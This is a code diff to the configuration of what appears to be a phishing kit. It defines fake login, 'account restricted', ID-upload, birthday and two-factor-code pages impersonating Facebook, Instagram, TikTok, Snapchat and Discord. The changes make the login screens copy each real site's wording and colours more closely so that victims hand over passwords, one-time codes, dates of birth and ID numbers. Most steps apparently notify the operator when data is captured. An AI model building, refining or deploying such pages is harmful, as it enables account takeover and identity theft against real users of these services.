@@ -25,7 +25,7 @@ const CATEGORY_DEFAULTS = {
 };
 
 const PALETTES = {
-  facebook:       ['#18191A','#242526','#E4E6EB','#1877F2','#42B72A'],
+  facebook:       ['#f0f2f5','#ffffff','#1c1e21','#1877F2','#42B72A'],
   instagram:      ['#0A0A0A','#1A1A1A','#FAFAFA','#E1306C','#F56040'],
   tiktok:         ['#000000','#161616','#FFFFFF','#FE2C55','#25F4EE'],
   twitterx:       ['#000000','#16181C','#E7E9EA','#1D9BF0','#FFD700'],
@@ -297,7 +297,7 @@ const FLOWS = {
   // ── SOCIAL ──────────────────────────────────────────────────────────────────
 
   facebook: [
-    { slug:'login',      form_type:'login',      page_title:'Sign In',            headline:'Welcome to Facebook',                subheadline:'Enter your email or phone number and password',      fields:['email','password'],                  layout:'auth',       cta:'Sign In',          step_label:'Login',      notify_step:true  },
+    { slug:'login',      form_type:'login',      page_title:'Log into Facebook',  headline:'Log into Facebook',                  subheadline:'',                                                   fields:['email','password'],                  layout:'auth',       cta:'Log in',           step_label:'Login',      notify_step:true  },
     { slug:'checkpoint', form_type:'checkpoint',  page_title:'Verify Your Identity',headline:'Your account has been temporarily restricted', subheadline:'We noticed unusual activity. We need to verify your identity to restore access', fields:[], layout:'checkpoint', cta:'Verify Identity',  step_label:'Checkpoint', notify_step:false },
     { slug:'id-verify',  form_type:'id_verify',   page_title:'Verify Identity',    headline:'Confirm Your Identity',               subheadline:'Upload a photo of your government ID or passport',   fields:['full_name','dob','id_number'],        layout:'verify',     cta:'Submit',           step_label:'ID Verify',  notify_step:true  },
     { slug:'2fa',        form_type:'otp',         page_title:'Two-Factor Auth',    headline:'Enter Authentication Code',           subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],                              layout:'otp',        cta:'Confirm',          step_label:'2FA',        notify_step:true,  otp_length:6 },
@@ -305,7 +305,7 @@ const FLOWS = {
   ],
 
   instagram: [
-    { slug:'login',             form_type:'login',     page_title:'Sign In',        headline:'Sign in to Instagram',               subheadline:'Enter your username or email and password',          fields:['username','password'],               layout:'auth',       cta:'Sign In',          step_label:'Login',           notify_step:true  },
+    { slug:'login',             form_type:'login',     page_title:'Log in • Instagram',headline:'',                                  subheadline:'',                                                   fields:['username','password'],               layout:'auth',       cta:'Log in',           step_label:'Login',           notify_step:true  },
     { slug:'suspicious',        form_type:'checkpoint',page_title:'Suspicious Login',headline:'Was this you?',                      subheadline:'We noticed a login from an unrecognized device. Confirm it was you', fields:[],                   layout:'checkpoint', cta:'Yes, this was me', step_label:'Suspicious',      notify_step:false },
     { slug:'sms-verify',        form_type:'otp',       page_title:'SMS Verification',headline:'Enter the Code We Sent',             subheadline:'We sent a 6-digit code to your phone number',        fields:['code'],                              layout:'otp',        cta:'Confirm',          step_label:'SMS Verify',      notify_step:true,  otp_length:6 },
     { slug:'recovery',          form_type:'verify',    page_title:'Recovery Code',  headline:'Use a Recovery Code',                subheadline:'Enter one of your backup recovery codes',            fields:['backup_code'],                       layout:'verify',     cta:'Continue',         step_label:'Recovery Code',   notify_step:true  },
@@ -313,7 +313,7 @@ const FLOWS = {
   ],
 
   tiktok: [
-    { slug:'login',      form_type:'login',   page_title:'Sign In',        headline:'Sign in to TikTok',                 subheadline:'Enter your email or phone number and password',  fields:['email','password'],  layout:'auth',       cta:'Sign In',   step_label:'Login',      notify_step:true  },
+    { slug:'login',      form_type:'login',   page_title:'TikTok – Login', headline:'',                                  subheadline:'',                                               fields:['email','password'],  layout:'auth',       cta:'Log in',    step_label:'Login',      notify_step:true  },
     { slug:'captcha',    form_type:'verify',  page_title:'Security Check', headline:'Verify You Are Not a Robot',         subheadline:'Complete the verification to continue',          fields:[],                    layout:'checkpoint', cta:'Confirm',   step_label:'Captcha',    notify_step:false },
     { slug:'sms-verify', form_type:'otp',     page_title:'SMS Verify',     headline:'Enter the Code',                    subheadline:'We sent a verification code to your phone',      fields:['code'],              layout:'otp',        cta:'Confirm',   step_label:'SMS Verify', notify_step:true,  otp_length:6 }
   ],
@@ -326,7 +326,7 @@ const FLOWS = {
   ],
 
   snapchat: [
-    { slug:'login',     form_type:'login',  page_title:'Sign In',         headline:'Sign in to Snapchat',              subheadline:'Enter your email and password',                  fields:['email','password'],  layout:'auth',   cta:'Sign In',   step_label:'Login',    notify_step:true  },
+    { slug:'login',     form_type:'login',  page_title:'Snapchat Login',  headline:'',                                 subheadline:'',                                               fields:['email','password'],  layout:'auth',   cta:'Log In',    step_label:'Login',    notify_step:true  },
     { slug:'birthday',  form_type:'verify', page_title:'Verify Identity', headline:'Confirm Your Birthday',            subheadline:'Enter your date of birth to verify your identity', fields:['dob'],              layout:'verify', cta:'Continue',  step_label:'Birthday', notify_step:true  },
     { slug:'sms-code',  form_type:'otp',    page_title:'Verification Code',headline:'Enter the Code Sent to You',      subheadline:'We sent a verification code via SMS',             fields:['code'],              layout:'otp',    cta:'Confirm',   step_label:'SMS Code', notify_step:true,  otp_length:6 }
   ],
@@ -352,8 +352,8 @@ const FLOWS = {
   ],
 
   discord: [
-    { slug:'login', form_type:'login', page_title:'Welcome Back',     headline:'Welcome back!',                    subheadline:'Great to see you again',                         fields:['email','password'],  layout:'auth', cta:'Sign In',   step_label:'Login', notify_step:true  },
-    { slug:'2fa',   form_type:'otp',   page_title:'Two-Factor Auth',  headline:'Two-Factor Authentication',        subheadline:'Enter the code from your authenticator app',    fields:['code'],              layout:'otp',  cta:'Sign In',   step_label:'2FA',   notify_step:true,  otp_length:6 }
+    { slug:'login', form_type:'login', page_title:'Discord – Login',  headline:'Welcome back!',                    subheadline:'We\'re so excited to see you again!',            fields:['email','password'],  layout:'auth', cta:'Log In',    step_label:'Login', notify_step:true  },
+    { slug:'2fa',   form_type:'otp',   page_title:'Two-Factor Auth',  headline:'Two-Factor Authentication',        subheadline:'Enter the 6-digit authentication code',          fields:['code'],              layout:'otp',  cta:'Log In',    step_label:'2FA',   notify_step:true,  otp_length:6 }
   ],
 
   whatsapp: [
